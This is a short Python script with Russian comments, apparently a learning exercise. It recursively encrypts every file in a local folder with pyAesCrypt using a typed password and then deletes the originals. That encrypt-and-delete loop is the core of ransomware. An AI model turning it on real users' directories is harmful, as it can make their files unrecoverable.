import pyAesCrypt
import os


# функция шифрования файла
def encryption(file, password):

    # задаём размер буфера
    buffer_size = 512 * 1024

    # вызываем метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    # чтобы видеть результат выводим на печать имя зашифрованного файла
    print("Файл [" + str(os.path.splitext(file)[0]) + "] зашифрован")

    # удаляем исходный файл
    os.remove(file)


# функция сканирования директорий
def go_dirs(dir, password):

    # перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если находим файл, то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)

        # если находим директорию, то повторяем цикл
        else:
            go_dirs(path, password)


password = input("Введите пароль для шифрования: ")
go_dirs("C:/Users/37529/PycharmProjects/Encryption/file", password)
